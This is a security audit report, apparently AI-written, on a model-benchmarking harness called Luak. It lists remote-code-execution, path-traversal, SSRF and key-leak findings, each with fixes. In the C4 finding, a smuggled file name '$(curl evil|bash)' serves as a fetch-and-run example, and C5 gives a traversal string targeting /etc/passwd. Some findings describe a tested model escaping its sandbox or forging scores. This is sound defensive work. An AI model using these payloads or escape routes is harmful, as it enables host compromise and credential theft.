# Luak Security & Reliability Audit — Fable 5
Date: 2026-06-10
Model: Fable 5 (switched to Opus 4.8 mid-audit due to safety measures)
Codebase: ~56K lines TypeScript, 1630 tests, 10 pre-existing failures

**Headline:** Luak's integrity model is cryptographically sound on paper but inert in this deployment. The host-execution paths have two direct RCE vectors. No HMAC key is configured, so every bundle is signed with no signature at all.

## The single most important fact

**No HMAC key is configured.** `.env`, `start.sh`, and `luak.service` set provider keys and host/port but never `LUAK_HMAC_KEY`/`CRUCIBLE_HMAC_KEY`. Per `core/bundle.ts:92-95`, this means every bundle is signed with *no signature at all* — only a content hash computed by `computeBundleHash`, a public pure function with no secret.

- **HTTP leaderboard** correctly quarantines everything as `legacy_unverified` → public leaderboard is empty/all-quarantined in shipped config. Fail-closed, but non-functional.
- **CLI leaderboard** does NOT gate on verification at all — ranks and saves submissions from unverified bundles.

---

## CRITICAL (7)

### C1 — Two leaderboard code paths with divergent trust enforcement; CLI path ranks unverified bundles
- **FILE:** `leaderboard/aggregator.ts:63-77`, `:90-225`, `:179` (`allVerified` computed but never used to filter); consumed by `cli/commands/leaderboard.ts:16-20,35-38`.
- **PROBLEM:** `loadVerifiedBundle` returns bundles even when verification fails. The aggregator pushes every bundle into scoring. It computes `allVerified` but never excludes unverified bundles. The HTTP route has a separate correct gate that the CLI path doesn't share.
- **IMPACT:** Anyone who can write a `.json` into `runs/` crafts a forged bundle and it ranks #1 via `luak leaderboard show`/`submit`. Full rankings forgery on CLI path.
- **FIX:** Make aggregator reuse HTTP route's eligibility gate. Refuse to build/submit if `allVerified` is false.

### C2 — Integrity model is inert without an HMAC key; forged and legitimate bundles are indistinguishable
- **FILE:** `core/bundle.ts:92-95, 105-107, 493-523`; deployment config (no key).
- **PROBLEM:** With no key, both legit and attacker-forged bundles verify to `signature_status="legacy_unverified"`. Content hash provides corruption-detection, not authenticity.
- **IMPACT:** The entire trust model is decorative until a key is set.
- **FIX:** Generate and set `LUAK_HMAC_KEY`/`CRUCIBLE_HMAC_KEY` in `.env`. Consider asymmetric signing so verification doesn't require distributing the signing secret.

### C3 — Arbitrary code execution via auto-executed task setup.sh
- **FILE:** `core/workspace.ts:73-81`.
- **PROBLEM:** `createWorkspace` does a verbatim `cpSync` of an arbitrary task repo, then `execSync("bash ${setupScript}")`. Any task repo shipping `.crucibulum/setup.sh` runs arbitrary shell as the `luak` service user with read access to plaintext provider keys in `.env`.
- **IMPACT:** A "benchmark task" is a trojan → host compromise + provider-key exfiltration. No opt-in, no sandbox.
- **FIX:** Remove auto-exec, or gate behind explicit `--allow-setup` + signed-task allowlist, and run inside a real sandbox (container/firejail, no network, scratch HOME).

### C4 — Command injection via model-controlled filename in git diff collection
- **FILE:** `utils/diff.ts:40` — `execSync(`git diff HEAD -- "${filePath}"`)`.
- **PROBLEM:** `filePath` comes from `git diff --name-status` over files the model-under-test created. A model creating a file named `$(curl evil|bash)` gets payload executed. Double-quotes don't stop `$(...)`/backtick expansion.
- **IMPACT:** RCE driven by the adversarial agent the harness exists to sandbox — the sandbox defeated from inside.
- **FIX:** `execFileSync("git", ["diff", "HEAD", "--", filePath])` — no shell. Same for any filename-bearing git call.

### C5 — Path-traversal cluster: arbitrary file read AND write via unsanitized IDs
- **FILE:** `cli/commands/replay.ts:18`, `cli/commands/verify.ts:14`, `core/conversational-runner.ts:115-119`, `core/manifest.ts:41`, `core/conversational-runner.ts:85-101`.
- **PROBLEM:** No identifier validated against a safe charset before `path.join`. Verified: `join("/x/runs", "../../etc/passwd.json")` escapes. `sessionId` from untrusted manifest → `writeFileSync` — arbitrary file write.
- **IMPACT:** Arbitrary *.json read (file-read oracle) and arbitrary file write (→ RCE by overwriting a script/service).
- **FIX:** One shared `assertSafeId()` (`^[A-Za-z0-9._-]+$`, reject `/`, `\`, `..`) + post-resolve containment assertion at every `join(dir, untrustedId)` site.

### C6 — Unauthenticated SSRF + credential exfiltration via provider baseUrl
- **FILE:** `server/routes/registry.ts:123-167`, `core/provider-registry.ts:442,471`.
- **PROBLEM:** `POST /api/registry/providers` accepts `baseUrl` as arbitrary string, then `/test` does `fetch(\`${baseUrl}${probePath}\`)` — **sending the configured Authorization header to the attacker-chosen host**. No auth on the endpoint.
- **IMPACT:** Clean unauthenticated SSRF to internal services + exfiltration of any configured provider key to an attacker host.
- **FIX:** Validate baseUrl on write (require `https?:`, reject private/link-local/loopback IPs unless preset is local); never send auth headers to unapproved hosts.

### C7 — Custom scorer plugins are fully trusted and can force a pass
- **FILE:** `core/scorer-registry.ts:54-128`, `core/conversational-judge.ts:1539-1557`.
- **PROBLEM:** No signature/allowlist on scorer loading; output bounds never enforced. A plugin returning `{passed:true, score:999}` yields full credit.
- **IMPACT:** Any writable `/scorers/` dir → arbitrary score inflation.
- **FIX:** Validate `score()` output at call time (typeof, range check); load only from a signed manifest/allowlist.

---

## HIGH (8)

### H1 — No authentication on any endpoint, including state-mutating and destructive ones
- **FILE:** `server/app.ts:48-222`; destructive `POST /api/storage/cleanup` self-authorizes via request body.
- **IMPACT:** Anyone reaching the port can register/delete providers, trigger SSRF (C6), spend provider credits, and permanently delete run evidence.
- **FIX:** Bearer-token gate for all writes; refuse non-loopback bind without a token.

### H2 — Provider error bodies (with embedded secrets) persisted to bundles and logged, un-redacted
- **FILE:** `core/provider-errors.ts:92`, `core/conversational-runner.ts:574-605`, `core/bundle.ts:369`, `utils/logger.ts:14-26`.
- **PROBLEM:** `core/redact.ts` exists but is only wired into `failure-evidence.ts` — not the bundle/timeline/logger paths. 401/403/429 bodies routinely echo Authorization header or key fragments. Redactor also misses `sk-ant-…`, `AIza…`, JWT, Google `?key=` form.
- **IMPACT:** Provider keys land verbatim in shareable evidence bundles and in logs.
- **FIX:** Recursively `redactSecrets()` in writeBundle/appendToBundle and in log(); extend redact patterns.

### H3 — Inline API keys bridged into global process.env, breaking per-adapter credential isolation
- **FILE:** `adapters/registry.ts:577-594`.
- **PROBLEM:** Shared mutable global across concurrent runs. OpenAI-compatible and OpenRouter presets both map to same env var; whichever key hydrates first wins. Combined with unvalidated base_url (C6), provider A's key can be POSTed to provider B's attacker-controlled endpoint.
- **IMPACT:** Cross-provider key bleed + nondeterministic race.
- **FIX:** Never mutate process.env. Pass resolved key only via AdapterConfig.api_key.

### H4 — Rate limiter trivially bypassed via spoofed X-Forwarded-For
- **FILE:** `server/rate-limit.ts:31-38`.
- **PROBLEM:** `clientKey` trusts X-Forwarded-For with no trusted-proxy config. 120 runs/min × 10 tasks = 1200 paid executions/min.
- **IMPACT:** Provider-credit cost-DoS.
- **FIX:** Key on `req.socket.remoteAddress` unless peer is a configured trusted proxy.

### H5 — Unvalidated JSON deserialization (prototype-pollution surface)
- **FILE:** `core/suite-loader.ts:76-134`, `core/bundle.ts:548-558`, `core/conversational-runner.ts:89-96`, `core/oracle.ts:38-50`.
- **PROBLEM:** Every JSON.parse result is cast with pure wishful typing, zero runtime validation. Oracle path allows absolute/.. paths; hash check bypassable via `hash_required:false`.
- **IMPACT:** Score manipulation, oracle substitution, DoS.
- **FIX:** Validate against strict zod/ajv schema rejecting `__proto__`/`constructor`/`prototype`. Reject absolute/.. oracle paths; require valid sha256 unconditionally.

### H6 — Regression checks default to pass when no command exists
- **FILE:** `core/judge.ts:265-276`.
- **PROBLEM:** Absence of an executable test = success. Oracle with empty-command regression checks grants free credit.
- **IMPACT:** Score inflation via under-specified oracles.
- **FIX:** Treat command-less regression checks as unsupported/not-counted.

### H7 — Bundle self-declares "infrastructure failure" to dodge failure accounting
- **FILE:** `core/verdict.ts:331-411`, `:252`.
- **PROBLEM:** `failure_is_infrastructure` read from the forgeable bundle. Stamping it `true` converts FAIL to NC, deflating `model_failure_rate`.
- **IMPACT:** Failure-rate manipulation.
- **FIX:** Only honor from HMAC-verified bundles; recompute verdict from raw signals.

### H8 — Snapshot read is unbounded + follows symlinks
- **FILE:** `core/workspace.ts:143-158`, `utils/diff.ts:64-94`.
- **PROBLEM:** `snapshotFiles` reads every file into one in-memory map. Symlinks followed. `startsWith` without separator allows sibling-dir escape.
- **IMPACT:** OOM via huge file; disclosure via symlink to out-of-workspace file; sibling-dir escape.
- **FIX:** Cap per-file/total bytes; lstat + skip symlinks; compare against `resolve(ws)+sep`.

---

## MEDIUM (9)

- **M1** — Wildcard CORS (`Access-Control-Allow-Origin: *`) enables localhost-API drive-by / DNS rebinding. `server/routes/shared.ts:34-42`. A malicious website can `fetch("http://127.0.0.1:18795/api/...")` and read provider config / runs.
- **M2** — Internal error strings leaked to clients. `server/app.ts:220`, `run.ts:559` merges provider error detail into responses.
- **M3** — Unbounded disk re-scans per read request. `loadBundles` + `inspectMalformedBundleFiles` re-walk dir on every `/api/leaderboard` hit, no cache. O(N·hash) → amplification DoS.
- **M4** — Oracle anti-cheat and refusal scoring use weak substring matching. Broad `REFUSAL_PATTERNS` let compliant-but-unsafe answers that name-drop refusal phrases score as refusals.
- **M5** — Unbounded model output into scorer regex (ReDoS/cost). Multiple global regexes over full response with no length cap.
- **M6** — Workspaces leak on crash. `keepWorkspaces=true` default; sweep only wired into `/api/health`. SIGKILL/OOM → unbounded disk leak.
- **M7** — Silent error swallowing masks corrupt/forged inputs. Numerous bare `catch {}`. `snapshotWorkspace` returns string `"snapshot-failed"` indistinguishable from a real hash.
- **M8** — Provider-controlled `Retry-After` honored up to 24h. Malicious endpoint can stall a batch.
- **M9** — `--output` and most lookup routes skip `isSafeId`. Latent traversal, defense-in-depth gap.

---

## LOW (6)

- **L1** — `snapshotWorkspace` is dead code with a latent `git commit -m "${message}"` shell-injection footgun.
- **L2** — Vision-promote endpoint gated only by a hardcoded confirmation phrase; operator is attacker-supplied and recorded verbatim.
- **L3** — `provider-registry.json` stores inline keys in plaintext with default umask. Restrict to 0600.
- **L4** — `start.sh` reliability bugs: `source .env … || true` swallows malformed-env failures; `set -e` aborts before health check.
- **L5** — Determinism: `pass@1` ordering depends on editable `timestamp_start`; a forged bundle picks which run is "pass@1."
- **L6** — Model/jobId interpolated into URL paths unencoded (`adapters/google.ts:211`, `grimoire-cc.ts:142`). Use `encodeURIComponent`.

---

## 10 Failing Tests — Diagnosis

1. **Vision fixture hash mismatches** (V2, V7–V9, V14, Phase-3/4 guards) — working-tree PNGs were regenerated under Pillow 12.2.0 but manifest sha256 pins still match committed bytes. Hash check fired as designed. Resolution: `git checkout -- fixtures/vision/` or deliberately re-pin.
2. **Leaderboard min-N tests + /api/scores/sync 500** — `better-sqlite3` native bindings aren't built. Fix: `pnpm rebuild better-sqlite3`.
3. **Two scorer tests depend on local `runs/` artifacts** — test-design issue; make them skip when no matching bundles are present.

---

## What's Correctly Engineered (don't "fix" away)

- HTTP leaderboard eligibility gate re-verifies on read, quarantines unverified bundles
- Advisory review layer properly fenced against prompt injection
- Score-store sync validates range (0-100) before storeScores
- Body size capped at 2MB; registry GETs mask inline keys; circuit-breaker state machine correct

---

## Top Priorities (in order)

1. Set/enforce HMAC key (C2) + make CLI leaderboard share HTTP eligibility gate (C1)
2. Kill two RCE vectors (C3 setup.sh auto-exec, C4 git-diff shell injection)
3. Stop persisting/logging raw provider error bodies (H2) — real keys leaking into bundles and logs
4. Add auth + validate baseUrl (H1, C6) before exposing beyond loopback
5. Shared `assertSafeId()` helper (C5) closes the entire traversal cluster
